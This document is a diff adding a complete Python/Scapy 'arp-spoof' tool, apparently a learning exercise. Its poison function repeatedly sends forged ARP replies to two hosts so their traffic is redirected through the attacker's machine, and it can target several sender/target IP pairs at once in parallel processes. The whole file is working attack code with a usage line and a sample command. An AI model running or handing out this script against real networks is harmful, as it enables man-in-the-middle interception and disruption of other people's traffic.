@@ -1,0 +1,63 @@
+#!/usr/bin/python3
+
+from scapy.all import *
+import socket
+import fcntl
+import struct
+import time
+from sys import argv
+from multiprocessing import Process
+
+# https://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-from-a-nic-network-interface-controller-in-python
+def get_ip_address(ifname):
+	if isinstance(ifname, str):
+		ifname = ifname.encode()
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	return socket.inet_ntoa(fcntl.ioctl(
+		s.fileno(),
+		0x8915,  # SIOCGIFADDR
+		struct.pack('256s', ifname[:15])
+	)[20:24])
+	
+def poison(sip, tip, smac, tmac):
+	while True:
+		send(ARP(pdst=sip, psrc=tip, hwdst=smac, op=2), verbose=0)
+		send(ARP(pdst=tip, psrc=sip, hwdst=tmac, op=2), verbose=0)
+		time.sleep(10)
+
+def action(sip, tip, mip):
+	smac = getmacbyip(sip)
+	tmac = getmacbyip(tip)
+	
+	Process(target=poison, args=(sip, tip, smac, tmac)).start()
+	
+	while True:
+		send(ARP(psrc=sip, pdst=tip, hwsrc=smac, hwdst="ff:ff:ff:ff:ff:ff", op=2), count=5, verbose=0)
+		send(ARP(psrc=tip, pdst=sip, hwsrc=tmac, hwdst="ff:ff:ff:ff:ff:ff", op=2), count=5, verbose=0)
+		time.sleep(1)
+	pass
+
+def usage():
+	print("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]")
+	print("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2")
+
+if __name__ == "__main__":
+	if len(argv) % 2:
+		usage()
+		exit()
+		
+	dev = argv[1]
+	try:
+		mip = get_ip_address(dev)
+	except:
+		print(f"Error during getting info of device: {dev}")
+		exit()
+	
+	ips = argv[2:]
+	req = len(ips) // 2
+	
+	for i in range(req):
+		sip, tip = ips[2 * i:2 * (i + 1)]
+		Process(target=action, args=(sip, tip, mip)).start()
+
+	
